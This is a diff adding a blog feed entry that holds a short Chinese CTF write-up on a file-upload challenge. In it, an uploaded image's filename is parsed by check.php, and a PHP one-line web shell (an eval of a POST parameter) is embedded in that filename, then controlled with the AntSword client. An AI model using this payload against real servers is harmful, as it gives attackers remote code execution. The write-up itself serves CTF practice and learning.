@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>CTF WP</title>
+      <link href="/2026/01/03/ctf-wp/"/>
+      <url>/2026/01/03/ctf-wp/</url>
+      
+        <content type="html"><![CDATA[<p>文件上传</p><p>看代码，有check.php</p><p><img src="/./assets/image-20251229205517431.png" alt="image-20251229205517431"></p><p>上传图片，访问/check.php</p><p><img src="/./assets/image-20251229205654471.png" alt="image-20251229205654471"></p><p>发现图片名解析了，用图片名写入木马（要在liunx系统中传）</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'1'</span>]);<span class="meta">?&gt;</span>.png</span><br></pre></td></tr></tbody></table></figure><p>访问，用蚁剑连接</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> WP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Hello World</title>
       <link href="/2026/01/01/hello-world/"/>
       <url>/2026/01/01/hello-world/</url>
